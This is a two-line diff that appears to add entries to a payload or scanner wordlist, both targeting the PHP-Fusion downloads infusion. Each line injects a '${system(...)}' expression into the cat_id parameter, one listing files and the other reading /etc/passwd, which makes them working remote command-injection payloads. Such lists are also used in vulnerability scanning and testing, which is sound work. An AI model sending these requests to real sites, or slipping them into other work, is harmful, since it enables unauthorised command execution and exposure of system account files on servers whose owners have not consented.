@@ -1,0 +1,2 @@
+/infusions/downloads/downloads.php?cat_id=${system(ls)}
+/infusions/downloads/downloads.php?cat_id=${system(cat /etc/passwd)}
